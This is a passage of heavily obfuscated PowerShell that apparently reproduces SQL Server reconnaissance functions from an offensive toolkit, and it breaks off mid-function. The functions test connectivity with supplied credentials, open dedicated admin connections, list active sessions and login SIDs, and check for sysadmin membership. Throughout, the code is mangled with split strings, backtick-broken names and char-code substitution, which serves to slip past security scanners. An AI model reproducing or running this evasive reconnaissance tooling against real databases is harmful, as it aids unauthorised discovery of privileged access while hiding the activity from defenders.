 $dcl =[TYpe]("{4}{0}{1}{2}{3}" -F'm.bIt','c','oNVE','rTer','syste');  &("{1}{2}{0}" -f'M','set','-iTE') ("{1}{0}{2}" -f 'riABLe:','va','Jr3') (  [TyPe]("{0}{1}"-F 'CoNVeR','t')  );  Function geT-cO`M`putERN`A`M`eFroMi`NsTance {
    [CmdletBinding()]
    Param(
        [Parameter(MAndaToRY = ${fal`SE},
                VaLUeFrOMPipeLInE = ${Tr`UE},
                VaLUefRompipELiNEbyprOPerTYNamE = ${T`RUe},
        helpMeSSagE = {"{2}{1}{0}{4}{3}" -f ' insta','er','SQL Serv','e.','nc'})]
        [string]${InS`TANcE}
    )
    If (${iN`sT`AncE}) {
        ${COm`P`UT`er`NAME} = ${IN`STAnCe}.("{1}{0}"-f'it','spl').Invoke('\')[0].("{1}{0}"-f 'lit','sp').Invoke(',')[0]
    } else {
        ${COMpu`T`ER`NAMe} = ${env`:CO`mPuT`erna`me}
    }
    Return ${COM`PutER`NA`ME}
}
Function  g`E`T-SQ`LCon`NeC`TiO`NTeST {
    [CmdletBinding()]
    Param(
        [Parameter(MandaToRY = ${faL`SE},
        heLPmEsSaGe = {"{10}{2}{1}{8}{9}{6}{5}{12}{0}{7}{3}{4}{11}"-f 'n','er ','rv','t','e','to auth','nt ','tica','or domain a','ccou','SQL Se',' with.','e'})]
        [string]${UsE`Rn`AmE},
        [Parameter(mAnDatOry = ${f`A`lsE},
        HeLPMEsSaGe = {"{11}{9}{4}{3}{0}{2}{5}{12}{6}{8}{7}{1}{10}"-f'i','cate wit','n','or doma','Server ',' ','asswor',' authenti','d to',' ','h.','SQL','account p'})]
        [string]${P`Asswo`Rd},
        [Parameter(ManDAtoRy = ${fA`LSe},
                VAluefrOMPIpeLINE = ${tr`UE},
                valUEFRoMpipElinebyproPertyNamE = ${Tr`UE},
        HELPmesSagE = {"{4}{6}{1}{0}{5}{2}{3}"-f 'rv','L Se','n',' to.','S','er instance to connectio','Q'})]
        [string]${Inst`A`NcE},
        [Parameter(MaNdAtORY = ${Fal`se},
        hELPMESsage = {"{7}{6}{1}{3}{0}{4}{5}{2}"-f 'm','e','.','d Ad','in Co','nnection','edicat','Connect using D'})]
        [Switch]${d`Ac},
        [Parameter(mAnDaTORy = ${fA`l`Se},
        hElpMESSAGE = {"{5}{4}{3}{1}{2}{0}"-f'onnect to.',' to ','c','atabase','fault d','De'})]
        [String]${D`ATa`BAsE},
        [Parameter(MANdATOry = ${f`AlSe},
        heLpMESsAGE = {"{1}{3}{2}{4}{0}"-f '.','Connecti','n t','o','imeout'})]
        [string]${ti`mEo`Ut},
        [Parameter(MANDAToRY = ${Fal`se},
        heLpMessaGE = {"{3}{1}{10}{0}{8}{5}{12}{2}{6}{7}{4}{9}{11}" -f'e er','uppress ','n ','S','app','t','is',' wr','rors.  Used when func','ed','verbos','.','io'})]
        [switch]${sUp`p`RESsVeRB`o`SE}
    )

    Begin {
        ${T`BlR`E`SulTS} = &("{1}{0}{2}"-f 'ew-','N','Object') -TypeName ("{3}{5}{2}{0}{1}{4}"-f 'a','bl','DataT','Syste','e','m.Data.')
        ${nu`Ll} = ${tB`lR`EsUL`Ts}."COL`UM`NS".("{0}{1}"-f 'Ad','d').Invoke(("{2}{0}{1}{3}"-f'omput','erNam','C','e'))
        ${nu`ll} = ${TBL`RESUL`TS}."C`oLUm`NS".("{1}{0}"-f 'd','Ad').Invoke(("{1}{0}{2}" -f 'nstan','I','ce'))
        ${n`Ull} = ${TBLr`ES`Ults}."C`OluM`Ns".("{1}{0}" -f'd','Ad').Invoke(("{0}{1}"-f 'Statu','s'))
    } Process {
        ${c`OMpuT`E`RnaMe} = &("{4}{3}{7}{2}{5}{6}{0}{8}{1}"-f's','e','pute','t-C','Ge','rNameFro','mIn','om','tanc') -Instance ${I`N`stAnCe}
        if(-not ${i`NsTa`NcE}) {
            ${INs`TaN`Ce} = ${ENv:coMpuTE`Rn`A`me}
        }

        if(${D`Ac}) {
            ${c`oNnE`Ct`ION} = &("{0}{1}{2}{3}{4}" -f'Get-SQ','LC','o','nne','ctionObject') -Instance ${I`NS`TanCE} -Username ${U`sERNa`Me} -Password ${pAss`wOrd} -DAC -TimeOut ${Ti`meo`UT} -Database ${DA`T`ABAse}
        } else {
            ${CoNnEC`Ti`on} = &("{2}{5}{0}{6}{1}{3}{7}{4}" -f 'nn','ti','Get-S','onO','ct','QLCo','ec','bje') -Instance ${inS`TANCE} -Username ${uSE`R`NAme} -Password ${pA`sswoRD} -TimeOut ${Ti`meouT} -Database ${D`A`TA`Base}
        }

        try {
            ${C`ON`NeC`TIOn}.("{1}{0}"-f'en','Op').Invoke()
            ${Nu`ll} = ${TBlR`eSU`ltS}."ro`Ws".("{0}{1}"-f'Ad','d').Invoke("$ComputerName","$Instance",("{2}{1}{0}{3}"-f'sibl','s','Acce','e'))
            ${Co`NN`EctIOn}.("{0}{1}" -f'Cl','ose').Invoke()
            ${COnNe`CT`I`on}.("{1}{2}{0}" -f 'se','Disp','o').Invoke()
        } catch {
            ${N`Ull} = ${TB`LR`eSUltS}."r`OWS".("{0}{1}" -f 'Ad','d').Invoke("$ComputerName","$Instance",("{2}{0}{1}{3}" -f'ot ','Accessib','N','le'))
        }
    } End {
        ${TB`lr`esultS}
    }
}
Function  GE`T-SQLsES`SiON {

    [CmdletBinding()]
    Param(
        [Parameter(MaNdaToRY = ${FA`LSE},
                vaLUeFrOMPIpEliNEByproPERTYNaME = ${T`RuE},
        HelpmESsage = {"{5}{10}{8}{12}{9}{2}{0}{7}{4}{13}{3}{1}{6}{11}" -f 'unt ','t','co','a','the','SQL Serv','e wi','to au','or d',' ac','er ','th.','omain','ntic'})]
        [string]${us`E`RNaMe},
        [Parameter(MAndAtory = ${f`Al`sE},
                VaLuefromPipElineBYPRoPERTyname = ${TR`UE},
        HeLPmESSAGe = {"{0}{16}{1}{10}{4}{3}{9}{2}{12}{14}{8}{11}{6}{5}{15}{13}{7}" -f 'SQL Ser','r ',' passwor','c','omain a','c','i','th.','au','count','d','thent','d','wi',' to ','ate ','ver o'})]
        [string]${pA`ssWo`RD},
        [Parameter(mAndAtory = ${FaL`se},
                ValueFroMpIpeLINEbYPRoPeRTyNAmE = ${tr`UE},
        HeLPMessaGe = {"{6}{5}{0}{8}{2}{1}{7}{4}{3}" -f 'erver ','e to ','tanc','to.','onnection ','QL S','S','c','ins'})]
        [string]${i`NStA`Nce},
        [Parameter(mANdaToRy = ${Fa`Lse},
                VAluEFroMpiPeLine = ${tR`Ue},
                vAluEFromPiPELIneBypRopERTYNAME = ${tr`Ue},
        helpmEssAGE = {"{2}{3}{1}{0}" -f 'palName.','i','Prin','c'})]
        [string]${pRiN`cIP`ALNa`Me},
        [Parameter(manDAToRY = ${F`AlSe},
        HELPmesSagE = {"{8}{12}{4}{10}{13}{1}{9}{14}{3}{6}{2}{7}{11}{0}{5}" -f 'pped','  Used','tio','e','es','.','n func','n is ','S',' ','s v','wra','uppr','erbose errors.','wh'})]
        [switch]${suppR`ESS`Verb`o`se}
    )

    Begin {
        ${tblS`eSSiO`Ns} = &("{3}{2}{0}{1}" -f 'w-Ob','ject','e','N') -TypeName ("{0}{5}{2}{3}{4}{1}" -f'Sys','able','Da','t','a.DataT','tem.')
        ${N`ULL} = ${tbLS`eSs`I`onS}."col`Um`Ns".("{0}{1}"-f 'Ad','d').Invoke(("{0}{2}{1}" -f 'Comp','rName','ute'))
        ${Nu`ll} = ${tBlS`eS`si`ONs}."col`U`mNs".("{0}{1}" -f 'A','dd').Invoke(("{0}{2}{1}" -f'In','ce','stan'))
        ${n`ULl} = ${TB`LSE`sSIoNS}."c`OLUmns".("{0}{1}"-f'A','dd').Invoke(("{1}{2}{3}{0}"-f'd','Pri','ncipal','Si'))
        ${n`UlL} = ${tBL`Se`sSIons}."c`olUM`NS".("{1}{0}"-f 'd','Ad').Invoke(("{3}{1}{2}{4}{0}" -f'Name','inc','i','Pr','pal'))
        ${nU`ll} = ${tb`l`SESSI`ONs}."col`U`mNS".("{0}{1}"-f 'Ad','d').Invoke(("{4}{0}{3}{2}{1}" -f'iginalPri','e','alNam','ncip','Or'))
        ${NU`LL} = ${TB`lSesS`Io`Ns}."c`oLUm`NS".("{1}{0}"-f 'd','Ad').Invoke(("{1}{2}{0}"-f 'd','Ses','sionI'))
        ${NU`ll} = ${tb`l`sessions}."c`o`lUmNs".("{0}{1}"-f 'A','dd').Invoke(("{1}{2}{3}{0}"-f'e','Sess','ion','StartTim'))
        ${n`UlL} = ${TblSe`SsiO`NS}."coLUM`NS".("{0}{1}" -f 'Ad','d').Invoke(("{0}{2}{1}{3}" -f'SessionLog','i','inT','me'))
        ${nu`LL} = ${TblsE`ssI`oNs}."Co`l`UMns".("{1}{0}" -f'dd','A').Invoke(("{0}{2}{1}" -f'Sessio','Status','n'))

        if(${Pr`i`NCIpA`LNAMe}) {
            ${pRINci`pAl`N`Am`EfilT`ER} = (' '+'and'+' '+'lo'+'gin_n'+'a'+'me '+'lik'+'e '+"'$PrincipalName'")
        } else {
            ${p`Ri`NCIP`AlNaMEf`il`TER} = ''
        }
    } Process {
        ${c`om`PUtERnaMe} = &("{3}{1}{5}{2}{0}{6}{4}" -f'eF','et-','rNam','G','mInstance','Compute','ro') -Instance ${i`N`STanCe}
        if(-not ${i`Ns`TaN`CE}) {
            ${INsT`A`N`cE} = ${eNv:`ComP`UtERna`ME}
        }

        ${T`E`StcoNn`eCTion} = &("{4}{1}{0}{3}{2}" -f 'Conn','SQL','tionTest','ec','Get-') -Instance ${iNS`TANCE} -Username ${U`S`ErNamE} -Password ${PA`ssW`oRD} | &("{2}{1}{0}"-f 't','-Objec','Where') -FilterScript {
            ${_}."STaT`US" -eq ("{2}{3}{0}{1}"-f 'sibl','e','Acc','es')
        }
        if(-not ${TE`Stco`Nne`CtIOn}) {
            return
        }

        ${qU`e`Ry} = (' '+' '+'USE'+' '+'master'+';'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'SE'+'LE'+'CT '+' '+"'$ComputerName' "+'a'+'s '+'[Co'+'mput'+'erNam'+'e],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$Instance' "+'a'+'s '+'[Instan'+'ce]'+','+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'secu'+'rity'+'_id '+'a'+'s '+'[P'+'rin'+'cipal'+'Sid],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'l'+'ogin'+'_name '+'a'+'s '+'[Princ'+'i'+'palNam'+'e],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'orig'+'in'+'al_login'+'_'+'name '+'a'+'s '+'[Or'+'ig'+'inalPri'+'nci'+'pal'+'N'+'a'+'me'+'],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s'+'ession_i'+'d'+' '+'a'+'s '+'['+'SessionI'+'d],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'la'+'st_req'+'ue'+'st_st'+'art_'+'ti'+'me '+'a'+'s '+'[Sessi'+'o'+'nStart'+'T'+'ime],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'log'+'i'+'n_time '+'as'+' '+'[Se'+'ssionLo'+'g'+'inTi'+'me'+'],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'st'+'at'+'us '+'as'+' '+'[Ses'+'si'+'onSt'+'atus]'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'FROM'+' '+' '+' '+' '+'[sys]'+'.['+'dm_ex'+'ec_'+'s'+'essi'+'ons]
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ORDER'+' '+'BY'+' '+'st'+'atus'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$PrincipalNameFilter")

        ${tbl`RES`UlTS} = &("{0}{1}{2}" -f 'Get-SQLQ','uer','y') -Instance ${in`STA`NcE} -Query ${q`UERy} -Username ${USe`RnAMe} -Password ${p`As`sw`oRd}

        ${tBL`ResU`LTs} | &("{3}{2}{4}{0}{1}" -f 'b','ject','ach-','ForE','O') -Process {
            ${nEws`iD} =  (  &("{1}{0}" -f'ariabLe','v')  ("{1}{0}" -f 'l','DC') -VaLu)::("{1}{0}" -f 'oString','T').Invoke(${_}."p`RI`NCipALSID").("{0}{1}" -f'Repla','ce').Invoke('-','')
            if (${nE`Ws`id}."L`eNGth" -le 10) {
                ${S`id} =  ( &('lS')  ("{1}{2}{0}"-f'r3','VaRIaBLE',':J')  )."v`AlUE"::("{0}{1}{2}"-f 'To','In','t32').Invoke(${n`e`wSID},16)
            } else {
                ${S`iD} = ${ne`w`Sid}
            }

            ${Nu`LL} = ${T`BLsEss`ioNS}."R`Ows"."A`DD"(
                [string]${_}."C`oMPuT`ernAMe",
                [string]${_}."i`NS`TANCe",
                ${s`Id},
                [string]${_}."pRINci`pA`LNAme",
                [string]${_}."origI`N`ALpRinc`IpAl`NA`mE",
                [string]${_}."SeSsIO`N`id",
                [string]${_}."sESSi`O`Ns`T`ARtTImE",
                [string]${_}."sessION`l`og`iNtI`mE",
                [string]${_}."sEs`SI`ONSTat`Us"
            )
        }
    } End {
        ${tBL`SE`SSiO`NS}
    }
}
Function  GET-S`qlSY`SaDMI`NC`HE`Ck {
    [CmdletBinding()]
    Param(
        [Parameter(manDATOry = ${fa`L`SE},
        HeLpMEssage = {"{8}{10}{9}{6}{7}{1}{0}{4}{2}{3}{11}{5}"-f'count to authe','ain ac','a','te','ntic','h.','do','m','SQL ','r ','Server o',' wit'})]
        [string]${US`Erna`Me},
        [Parameter(mANdAtoRY = ${f`Al`SE},
        HELpMeSSaGE = {"{5}{4}{2}{9}{6}{10}{11}{13}{14}{0}{1}{3}{7}{8}{12}"-f'sword',' to au','Server','th','L ','SQ','or domain','entica','te w',' ',' ac','count','ith.',' p','as'})]
        [string]${pa`SSW`Ord},
        [Parameter(MAnDatoRy = ${f`A`lsE},
                vaLueFROmPIPELiNeBYpROPerTynAME = ${T`RUe},
        HelPmessAgE = {"{4}{3}{5}{2}{8}{9}{0}{7}{1}{6}" -f 'o con','io','t','r ','SQL Serve','ins','n to.','nect','an','ce t'})]
        [string]${i`Nsta`Nce},
        [Parameter(MaNdATORY = ${f`AL`se},
        HelPMessAge = {"{7}{12}{10}{0}{8}{4}{5}{3}{2}{6}{1}{9}{11}{13}" -f 'rr','unc','n ','ed whe',' U','s','f','Suppress v','ors. ','tion ',' e','is','erbose',' wrapped.'})]
        [switch]${sUPPrEs`SvER`B`Ose}
    )

    Begin {
        ${TBLsYsADmi`N`s`T`ATUS} = &("{0}{2}{1}" -f'New','ject','-Ob') -TypeName ("{6}{4}{5}{2}{1}{3}{0}"-f'le','ata','.D','Tab','em.','Data','Syst')

        if(${cREd`ENTIaLn`AmE}) {
            ${c`Re`D`E`NTI`ALnamEFIltEr} = (' '+'WH'+'ERE '+'name'+' '+'lik'+'e '+"'$CredentialName'")
        } else {
            ${cr`eDENT`IaLN`AM`E`FIL`TeR} = ''
        }

    } Process {
        ${CoM`PUte`RName} = &("{0}{3}{5}{2}{4}{1}{7}{6}{8}"-f 'G','eFr','u','et-Co','terNam','mp','ta','omIns','nce') -Instance ${insT`AN`cE}
        if(-not ${i`NstA`N`ce}) {
            ${i`N`staNce} = ${ENv:C`omp`UT`er`NAmE}
        }

        ${t`Est`ConnEcT`i`On} = &("{2}{3}{0}{4}{1}{5}"-f 'SQLC','ne','Ge','t-','on','ctionTest') -Instance ${iN`s`TAnCE} -Username ${Us`ername} -Password ${PaSs`Wo`RD} | &("{2}{1}{0}"-f 't','-Objec','Where') -FilterScript {
            ${_}."s`TAtUs" -eq ("{0}{1}{2}" -f'Ac','cessib','le')
        }
        if(-not ${t`E`STcO`NNe`CtIon}) {
            return
        }

        ${qU`ery} = ('SE'+'LEC'+'T '+' '+' '+' '+"'$ComputerName' "+'a'+'s '+'[Com'+'pu'+'ter'+'N'+'ame],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$Instance' "+'as'+' '+'[Ins'+'tance]'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'C'+'ASE
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'W'+'HEN '+('IS_'+'SRVROLEMEMBER'+'(GU1s'+'y'+'sad'+'m'+'i'+'nGU1) ')."rEPL`A`ce"(([cHaR]71+[cHaR]85+[cHaR]49),[string][cHaR]39)+'= '+' '+'0 '+'THEN'+' '+('U0'+'QN'+'oU0Q
'+' ')."rep`Lace"('U0Q',[STRIng][ChAr]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ELSE'+' '+('{'+'0}Yes{'+'0}
 ')  -f[chaR]39+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'E'+'ND '+'as'+' '+'IsSy'+'s'+'admi'+'n')

        ${tB`lsySadm`INSTA`T`USteMP} = &("{2}{1}{0}" -f'QLQuery','et-S','G') -Instance ${i`Nstan`ce} -Query ${Qu`erY} -Username ${U`sErnAMe} -Password ${P`AsS`WOrD}
        ${tBlsYSa`DM`INs`TAtUS} = ${Tbl`sysa`Dm`i`N`STaTuS} + ${t`BL`sySadmi`N`sT`ATuST`emP}
    } End {
        ${TB`lsYS`Ad`M`inS`TaTUS}
    }
}
Function  G`E`T`-Sq`lCoNneCTi`ONo`B`JecT {
    [CmdletBinding()]
    Param(
        [Parameter(MAndatOrY = ${Fa`lSE},
        HelpmEsSAge = {"{12}{4}{7}{5}{1}{8}{9}{10}{2}{6}{0}{11}{3}" -f'e w','nt t','ica','th.','Server ','u','t','or domain acco','o a','u','thent','i','SQL '})]
        [string]${U`SERn`Ame},
        [Parameter(MaNDatOrY = ${f`A`LSe},
        HElpmESsAge = {"{4}{7}{8}{14}{9}{13}{10}{5}{0}{11}{2}{6}{1}{3}{15}{12}"-f'or','ica','ut','te','SQL Server o','w','hent','r domai','n a','count p','s','d to a','.','as','c',' with'})]
        [string]${PassW`OrD},
        [Parameter(ManDAtory = ${f`A`lSe},
                valuEFRoMpiPeliNEBYPROpERTYname = ${Tr`Ue},
        HELPmESsaGe = {"{2}{1}{7}{4}{6}{5}{0}{3}"-f'tion to','er','SQL Serv','.','nstance to ','ec','conn',' i'})]
        [string]${i`N`sTaNCe},
        [Parameter(MANDatORy = ${fA`lsE},
        HeLpmESSagE = {"{1}{3}{2}{4}{8}{5}{7}{6}{0}"-f'ion (DAC).','D','ted ','edica','A','nist','tor Connect','ra','dmi'})]
        [Switch]${d`Ac},
        [Parameter(MAnDAToRY = ${F`AlSe},
        helPmEssAGE = {"{4}{2}{1}{5}{0}{3}{6}"-f 'onn','t database t','faul','ect to','De','o c','.'})]
        [String]${D`Ata`BAsE},
        [Parameter(mAnDAToRY = ${F`AL`SE},
        HeLPmEssAge = {"{1}{0}{3}{4}{2}"-f 'ec','Conn','t.','tion t','imeou'})]
        [string]${tI`me`out} = 1
    )

    Begin {
        if(${d`Ac}) {
            ${DA`CcO`Nn} = ("{0}{1}{2}"-f'ADMI','N',':')
        } else {
            ${Da`cco`Nn} = ''
        }

        if(-not ${DAtAB`A`Se}) {
            ${D`ATa`BAse} = ("{0}{1}{2}"-f'Mast','e','r')
        }
    } Process {
        if ( -not ${in`ST`Ance}) {
            ${Insta`N`Ce} = ${ENV:cO`Mp`UTer`Name}
        }
        ${Co`N`NEcTi`on} = &("{0}{2}{1}{3}"-f 'New-O','jec','b','t') -TypeName ("{6}{10}{8}{9}{3}{1}{7}{5}{4}{0}{2}"-f 'ctio','Cl','n','.Sql','SqlConne','.','Syste','ient','a','ta','m.D')
        if (-not ${U`Se`RnAmE}) {
            ${aUTh`E`NTICAtIOnt`y`pe} = ("{4}{0}{6}{7}{1}{3}{5}{2}" -f'ent W','ws','redentials',' ','Curr','C','in','do')
            ${cO`NNec`Tion}."c`ON`NECTIo`NStR`InG" = ("Server=$DacConn$Instance;Database=$Database;Integrated "+'S'+'ec'+'urity='+'S'+'SPI;'+'C'+'on'+'nection '+'Ti'+'meo'+'ut='+'1')
        }
        if (${uSER`NA`Me} -like "*\*") {
            ${AUThe`NtiCA`T`iont`yPE} = ("{6}{1}{8}{5}{0}{4}{2}{7}{3}" -f'ows C','rov','d','s','re','Wind','P','ential','ided ')
            ${C`onNEc`Tion}."c`OnnE`c`TioN`StrinG" = ("Server=$DacConn$Instance;Database=$Database;Integrated "+"Security=SSPI;uid=$Username;pwd=$Password;Connection "+"Timeout=$TimeOut")
        }
        if ((${uSErN`AmE}) -and (${us`ERNA`Me} -notlike "*\*")) {
            ${Aut`HEntIcA`TiO`N`TYPE} = ("{2}{0}{4}{1}{3}"-f 'rov','L Lo','P','gin','ided SQ')
            ${ConN`ECt`IOn}."Co`Nne`C`T`IONsTRING" = ("Server=$DacConn$Instance;Database=$Database;User "+"ID=$Username;Password=$Password;Connection "+"Timeout=$TimeOut")
        }
        return ${coNnec`T`ION}
    } End {
    }
}
Function  GeT-`sQlqU`e`Ry {
    [CmdletBinding()]
    Param(
        [Parameter(MANdATORY = ${fal`Se},
                VAlueFrOMPipElINEByprOPeRtyname = ${tR`UE},
        HeLPMeSsagE = {"{9}{1}{6}{10}{0}{11}{7}{8}{4}{5}{12}{2}{3}"-f 'r do','S','e ','with.',' to a','uth','erve',' a','ccount','SQL ','r o','main','enticat'})]
        [string]${uS`er`Name},
        [Parameter(MANDatOry = ${F`Alse},
                VaLUEfROMpipELINEBypRoPeRTYNAMe = ${tR`UE},
        helPmEssAgE = {"{7}{3}{11}{5}{2}{1}{10}{8}{4}{0}{6}{9}" -f 't ','m','o','Q','coun',' Server or d','p','S',' ac','assword to authenticate with.','ain','L'})]
        [string]${PaS`sw`ORD},
        [Parameter(MANDaToRy = ${FAL`Se},
                VALuefRoMpipeLInEbYProPeRtYnAmE = ${TR`UE},
        HeLpMEssAge = {"{3}{0}{1}{10}{8}{7}{4}{9}{2}{6}{5}" -f 'L',' ','to co','SQ','e','nection to.','n',' instanc','ver',' ','Ser'})]
        [string]${iNStA`NCE},
        [Parameter(MaNDatORy = ${f`ALse},
                VaLuEfRoMPipELInebYPropErtynAME = ${T`RUe},
        HelPMEsSAGE = {"{4}{3}{2}{0}{5}{1}" -f 'uer','.','q','erver ','SQL S','y'})]
        [string]${Que`Ry},
        [Parameter(MAnDAtoRy = ${f`AlSe},
        HElpMEssaGe = {"{9}{1}{2}{5}{7}{6}{3}{8}{0}{4}{10}" -f 'n','ct u','s','Co','ec','ing Dedic','in ','ated Adm','n','Conne','tion.'})]
        [Switch]${d`Ac},
        [Parameter(MaNdAtory = ${FAl`se},
        helpmessaGE = {"{3}{0}{2}{1}{5}{4}{7}{8}{6}"-f'e','t d','faul','D',' c','atabase to','t to.','onne','c'})]
        [String]${D`At`ABa`sE},
        [Parameter(MAndAtORY = ${Fa`lse},
        heLPMESSAGE = {"{1}{3}{4}{0}{2}" -f 'n tim','Con','eout.','nec','tio'})]
        [int]${Ti`mE`oUt},
        [Parameter(mANDATory = ${f`Al`se},
        HELPMEsSAge = {"{4}{3}{6}{7}{0}{10}{11}{8}{5}{9}{1}{2}"-f'ed','rapp','ed.','ppress verbose','Su','ct',' e','rrors.  Us','un','ion is w',' whe','n f'})]
        [switch]${s`UP`PReSS`V`ErBOSe},
        [Parameter(mANDatory = ${f`AL`Se},
        hELpMeSSAgE = {"{3}{4}{6}{2}{0}{1}{5}"-f 'messa','ge if','or ','Ret','ur',' exists.','n err'})]
        [switch]${RETU`RnER`RoR}
    )

    Begin {
        ${tb`lq`UE`RYR`esULtS} = &("{2}{0}{1}"-f 'b','ject','New-O') -TypeName ("{0}{3}{1}{2}" -f'System','Data.DataTa','ble','.')
    } Process {
        if(${d`AC}) {
            ${ConNE`C`Ti`oN} = &("{2}{4}{3}{0}{1}" -f'jec','t','Get-S','LConnectionOb','Q') -Instance ${I`NSTa`NcE} -Username ${US`e`RNAMe} -Password ${pA`s`SwO`Rd} -TimeOut ${tim`EO`UT} -DAC -Database ${D`AtabA`Se}
        } else {
            ${COn`N`eCT`iON} = &("{2}{0}{3}{1}{4}" -f'SQLConnect','nObje','Get-','io','ct') -Instance ${iNs`T`A`NCe} -Username ${u`Se`RN`AmE} -Password ${pAss`WO`Rd} -TimeOut ${Tim`E`OuT} -Database ${d`A`TAB`ASe}
        }

        ${c`o`Nnect`IOn`strING} = ${con`Ne`CTi`On}."cO`NN`eCTiOnstRI`Ng"
        ${in`s`TAnCe} = ${Con`NEcTIO`NST`RiNG}.("{1}{0}" -f't','spli').Invoke(';')[0].("{1}{0}" -f 'lit','sp').Invoke('=')[1]

        if(${q`Uery}) {
            try {
                ${CONN`ec`TION}.("{0}{1}"-f'O','pen').Invoke()
                ${c`OmMa`Nd} = &("{2}{1}{0}" -f'ject','b','New-O') -TypeName ("{1}{0}{3}{4}{2}{5}{6}"-f 'tem','Sys','ent.Sql','.Data.Sq','lCli','Comman','d') -ArgumentList (${qU`E`Ry}, ${c`onNEC`TIoN})
                ${RES`U`ltS} = ${c`OmmAnD}.("{0}{1}{2}" -f 'Ex','ecuteR','eader').Invoke()
                ${tbLqUerYr`es`Ul`Ts}.("{0}{1}"-f'Loa','d').Invoke(${R`ES`ULts})
                ${Conne`c`Ti`On}.("{0}{1}"-f'Clo','se').Invoke()
                ${c`O`N`Nection}.("{0}{1}{2}"-f 'Dispo','s','e').Invoke()
            } catch {
                
            }
        } else {
            &("{0}{3}{2}{1}"-f 'Write-O','t','u','utp') -InputObject ("{10}{12}{8}{6}{0}{4}{1}{9}{11}{7}{3}{2}{5}" -f'ovide',' to Ge','ction','ry fun','d','.','y pr','e','r','t-SQ','No ','LQu','que')
            Break
        }
    } End {
        ${tBlqUe`R`YRES`UlTs}
    }
}
Function  GEt-sqL`ServERi`N`FO {
    [CmdletBinding()]
    Param(
        [Parameter(MAndaTOrY = ${faL`Se},
        hElpMesSAge = {"{11}{10}{3}{8}{9}{0}{5}{1}{7}{4}{2}{6}{12}" -f'in a','ou','o authe',' or ','t','cc','ntic','nt ','dom','a','QL Server','S','ate with.'})]
        [string]${usE`RN`AmE},
        [Parameter(mAndATORy = ${fAl`SE},
        HeLPmEssagE = {"{2}{10}{9}{7}{4}{8}{13}{12}{14}{0}{11}{6}{5}{3}{1}" -f 'o','ith.','SQL Serve','te w','t','ica','authent','un',' ','n acco','r or domai',' ',' ','password','t'})]
        [string]${Pa`SsWO`Rd},
        [Parameter(maNdAToRy = ${f`AlSe},
                VAluefroMPIpElinebyPROPERtYname = ${T`RuE},
        HeLpmessage = {"{8}{5}{3}{7}{2}{0}{1}{4}{6}"-f'to connection',' ','nce ',' i','to','QL Server','.','nsta','S'})]
        [string]${INs`Ta`NCe},
        [Parameter(ManDATORy = ${FAL`se},
        heLPmeSsagE = {"{7}{0}{2}{3}{5}{8}{6}{1}{4}{9}" -f 'ss ve','ap','rbose ','errors.  Used wh','pe','en ','wr','Suppre','function is ','d.'})]
        [switch]${su`P`P`ReSSvERbOSE}
    )

    Begin {
        ${Tb`lseRv`eRin`FO} = &("{0}{2}{1}{3}"-f'New-O','e','bj','ct') -TypeName ("{2}{3}{0}{1}" -f'ta','Table','System.Data.','Da')
    } Process {
        ${C`oMpUT`e`RnAmE} = &("{4}{7}{6}{3}{5}{0}{1}{2}" -f 'me','FromInst','ance','mputerN','G','a','-Co','et') -Instance ${i`NS`TAnCE}

        if(-not ${InST`A`Nce})
        {
            ${i`N`ST`ANCE} = ${ENv`:com`Pu`TeR`N`Ame}
        }

        
        ${Tes`TcoN`N`eCtIon} = &("{2}{3}{1}{0}{4}"-f'nnectionTe','o','Ge','t-SQLC','st') -Instance ${In`S`T`ANce} -Username ${U`se`RNAMe} -Password ${PA`Ssw`ORD} | &("{0}{2}{1}" -f'W','-Object','here') -FilterScript {
            ${_}."S`TatUs" -eq ("{0}{1}{2}"-f 'Acces','si','ble')
        }
        if(-not ${Tes`TCONNE`cT`iOn}) {
            return
        }

        ${Activ`eSess`iOnS} = &("{0}{2}{1}{3}"-f 'G','S','et-','QLSession') -Instance ${i`NsTAn`CE} -Username ${uS`e`RNaMe} -Password ${Pa`sS`word} |
        &("{2}{3}{1}{0}"-f 't','jec','Where','-Ob') -FilterScript {
            ${_}."Se`ss`IONsTA`TUS" -eq ("{0}{1}{2}"-f 'r','unnin','g')
        } | &("{1}{3}{0}{2}" -f'bjec','Me','t','asure-O') -Line | &("{1}{2}{0}"-f 'bject','Se','lect-O') -Property ("{0}{1}" -f 'Li','nes') -ExpandProperty ("{0}{1}"-f 'Li','nes')

        ${issYS`A`dM`In} = &("{3}{1}{4}{2}{0}" -f'Check','t-','admin','Ge','SQLSys') -Instance ${Ins`TAN`CE} -Username ${UsER`Na`mE} -Password ${pASsw`O`RD} | &("{2}{0}{1}"-f 'elec','t-Object','S') -Property ("{2}{0}{1}"-f 'sS','ysadmin','I') -ExpandProperty ("{2}{0}{1}" -f 'ysadmi','n','IsS')
        if(${is`s`y`sadMIn} -eq 'Yes') {
